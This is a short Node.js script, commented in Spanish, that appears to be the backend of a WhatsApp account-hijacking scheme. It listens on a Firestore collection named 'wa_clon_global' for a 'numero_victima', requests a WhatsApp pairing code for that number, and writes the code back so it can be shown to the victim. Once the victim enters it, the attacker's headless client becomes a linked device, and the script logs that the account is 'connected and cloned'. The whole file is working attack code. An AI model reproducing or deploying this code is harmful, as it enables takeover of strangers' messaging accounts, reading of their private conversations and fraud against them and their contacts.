const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { 
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); 
}
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// Función para procesar y generar el código
async function generarCodigo(snap) {
    const data = snap.data();
    if (data && data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
        console.log([!] Solicitando código para: ${data.numero_victima});
        try {
            // Importante: No pedir código si el cliente no está inicializado
            const code = await client.requestPairingCode(data.numero_victima);
            console.log([OK] CÓDIGO GENERADO: ${code});
            await snap.ref.update({
                pairingCode: code,
                status: "mostrando_codigo"
            });
        } catch (err) {
            console.error("[ERROR] Fallo al generar código:", err.message);
            // Si falla, reseteamos el status para poder reintentar
            await snap.ref.update({ status: "error", error: err.message });
        }
    }
}

// Escuchamos el documento de Firebase
db.collection("wa_clon_global").doc("current_session").onSnapshot(generarCodigo);

client.on('ready', () => {
    console.log("[!] WHATSAPP CONECTADO Y CLONADO");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

// Inicializamos el cliente
client.initialize();

// Servidor de respuesta para Render
http.createServer((req, res) => {
    res.write('MOTOR WA PAIRING ONLINE');
    res.end();
}).listen(process.env.PORT || 3000);
